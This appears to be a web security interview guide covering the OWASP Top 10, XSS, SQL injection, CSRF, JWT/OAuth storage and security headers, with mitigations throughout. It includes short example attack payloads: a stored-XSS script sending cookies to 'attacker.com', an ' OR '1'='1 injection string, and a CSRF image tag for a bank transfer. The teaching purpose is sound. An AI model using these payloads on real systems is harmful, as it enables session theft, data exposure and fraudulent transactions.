---
title: "Web Security Interview Guide: OWASP, XSS, SQL Injection, and Auth Security"
description: "Security knowledge for software engineering interviews — OWASP Top 10 in depth, XSS prevention, SQL injection, authentication security (JWTs, OAuth), CSRF, and security code review."
date: "2026-03-20"
category: "Security"
---

# Web Security Interview Guide: OWASP, XSS, SQL Injection, and Auth Security

Security questions appear in software engineering interviews more often than candidates expect — not just at security-focused companies but at any organization that takes engineering quality seriously. You don't need to be a penetration tester. You do need to demonstrate that you think about attack surfaces and know the standard mitigations. This guide covers what comes up most.

## The OWASP Top 10 as a Framework

The OWASP Top 10 is the most widely referenced classification of critical web security risks. Knowing it gives you a structured framework for discussing security in any interview. The current list (2021 version, still the reference in 2026) includes:

1. **Broken Access Control** — Users accessing resources they shouldn't (e.g., `GET /users/456/data` when you're user 123). The most common critical vulnerability. Prevention: enforce authorization server-side on every request, never rely on client-supplied roles.

2. **Cryptographic Failures** — Sensitive data stored or transmitted without adequate encryption. PII in plaintext databases, HTTP instead of HTTPS, weak hashing (MD5 for passwords). Prevention: HTTPS everywhere, bcrypt/Argon2 for passwords, AES-256 for sensitive stored data.

3. **Injection** — Attacker-controlled input executed as code (SQL, OS commands, LDAP). Prevention: parameterized queries, input validation, principle of least privilege for DB accounts.

4. **Insecure Design** — Missing security controls at the design level. Not a coding bug — a design oversight. Prevention: threat modeling before implementation.

5. **Security Misconfiguration** — Default credentials, unnecessary services enabled, verbose error messages revealing stack traces. Extremely common in cloud deployments. Prevention: security hardening checklists, IaC with security controls enforced.

6-10 cover vulnerable components, authentication failures, software integrity, logging failures, and SSRF.

Interviewers rarely expect you to recite all 10. What matters is that you can discuss several in depth and explain mitigations clearly.

## XSS: Three Types, One Prevention Model

Cross-site scripting (XSS) lets attackers inject malicious JavaScript that executes in victims' browsers. Three types:

**Stored XSS**: Malicious script is stored in the database (e.g., a forum post containing `<script>document.location='http://attacker.com?cookie='+document.cookie</script>`). Every user who views that post executes the script. Highest impact.

**Reflected XSS**: Malicious script is in the URL and reflected back in the response (e.g., a search page that outputs "You searched for: [query]" without escaping). Requires the victim to click a crafted link.

**DOM-based XSS**: Malicious script manipulates the DOM client-side without a server round-trip. Occurs when JavaScript reads from `location.hash` or `document.referrer` and writes it to the DOM without sanitization.

**Prevention:**
- **Output encoding**: Always HTML-encode user-controlled data before inserting into HTML. `<` becomes `&lt;`. Use your framework's built-in escaping (React's JSX does this automatically; Django templates do it by default).
- **Content Security Policy (CSP)**: HTTP header that tells browsers which script sources are trusted. `Content-Security-Policy: script-src 'self'` blocks inline scripts and scripts from other domains. A strong CSP is defense-in-depth even if output encoding fails.
- **HttpOnly and Secure cookie flags**: Prevent JavaScript from reading session cookies at all.

In code review, flag: `innerHTML = userInput`, `document.write()`, and any framework method that bypasses encoding (React's `dangerouslySetInnerHTML`).

## SQL Injection

SQL injection occurs when user input is concatenated into a SQL query string. The canonical example:

```sql
-- Vulnerable
SELECT * FROM users WHERE email = '" + userEmail + "';
-- Attacker input: ' OR '1'='1
-- Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1';
-- Returns all users
```

**Prevention: always use parameterized queries (prepared statements).**

```python
# Python with parameterized query
cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))
```

The driver sends the query and parameter separately — the database never interprets the parameter as SQL syntax. This is not optional; it's the non-negotiable baseline.

Additional defenses: ORMs (which use parameterized queries internally), WAF rules, and running the database account with minimal privileges (SELECT/INSERT/UPDATE only, no DROP TABLE).

In interviews, if asked "how do you prevent SQL injection," saying "parameterized queries" is correct and sufficient. Adding "and principle of least privilege for DB accounts" demonstrates depth.

## CSRF: Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making an unintended request to a site they're authenticated with. Example: a malicious page contains `<img src="https://bank.com/transfer?to=attacker&amount=1000">`. If the user is logged into bank.com, their session cookie is sent with the request.

**Prevention:**
- **CSRF tokens**: Server generates a unique token per session, includes it in forms, and validates it on state-changing requests. Attacker can't read the token from a different origin (same-origin policy).
- **SameSite cookie attribute**: `SameSite=Strict` or `SameSite=Lax` prevents cookies from being sent on cross-site requests. This is now the primary CSRF defense in modern applications — most frameworks set it by default.
- **Origin/Referer header checking**: Secondary check that the request originated from your domain.

## Authentication Security: JWTs, OAuth, and Session Management

This is a rich area that frequently surfaces in senior engineer interviews.

**JWT storage**: JWTs should NOT be stored in `localStorage` — XSS can read it. Store JWTs in `HttpOnly` cookies (not accessible to JavaScript) or use short-lived JWTs with refresh tokens stored in `HttpOnly` cookies. This is a frequently debated area — know both positions.

**JWT vulnerabilities**: The classic attack is sending a JWT with `"alg": "none"` to exploit servers that accept unsigned tokens. Always verify the algorithm is what you expect, not what the token claims.

**Refresh token rotation**: When a refresh token is used, invalidate it and issue a new one. If an old refresh token is used (indicating token theft), invalidate all refresh tokens for that user.

**OAuth 2.0 PKCE**: For public clients (mobile apps, SPAs), use Proof Key for Code Exchange. Prevents authorization code interception attacks. If asked about OAuth flows, PKCE is the correct answer for any client that can't keep a secret.

**Password storage**: Always bcrypt, Argon2id, or scrypt. Never MD5, SHA-1, or SHA-256 without a salt. Mention that the salt should be unique per user (bcrypt does this automatically).

## Security Headers

Know the major HTTP security headers for code review and design discussions:

- `Strict-Transport-Security` (HSTS): Forces HTTPS for all future requests
- `Content-Security-Policy`: Controls which resources can be loaded
- `X-Content-Type-Options: nosniff`: Prevents MIME type sniffing
- `X-Frame-Options: DENY`: Prevents clickjacking
- `Referrer-Policy`: Controls what's in the Referer header

## Security in Engineering Interviews

Security comes up in several ways: explicit security questions ("how would you secure this API?"), code review exercises ("what's wrong with this code?"), and system design (security components in your architecture).

For code review, train yourself to look for: unparameterized queries, missing output encoding, hardcoded credentials, over-permissive CORS, and sensitive data in logs.

For system design, always address: authentication mechanism, authorization model, data encryption at rest and in transit, and rate limiting. Mentioning these unprompted signals security-aware engineering thinking — exactly what senior roles require.
